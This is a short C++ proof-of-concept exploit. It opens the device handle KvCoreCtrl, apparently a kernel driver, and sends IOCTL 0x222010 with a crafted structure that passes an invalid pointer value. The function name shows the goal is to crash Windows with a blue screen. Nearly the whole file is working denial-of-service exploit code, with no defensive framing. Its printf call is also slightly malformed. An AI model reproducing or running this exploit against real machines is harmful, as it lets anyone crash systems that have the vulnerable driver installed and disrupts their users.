#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\KvCoreCtrl"
HANDLE hDevice;


struct DATA_0x222010
{
    int type;
    int id;
    PVOID addr;
};

void BSOD2_222010()
{
    DWORD dwWrite;
    DATA_0x222010 data;
    data.type = 5;
    data.id = 0;
    data.addr = (PVOID)1;
    DeviceIoControl(hDevice, 0x222010, &data, sizeof(data), NULL, 0, &dwWrite, NULL);
}


int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %d\n", "MyDriver", GetLastError());
        getchar();
        return 0;
    }
    BSOD2_222010();
    system("pause");
    return 0;
}
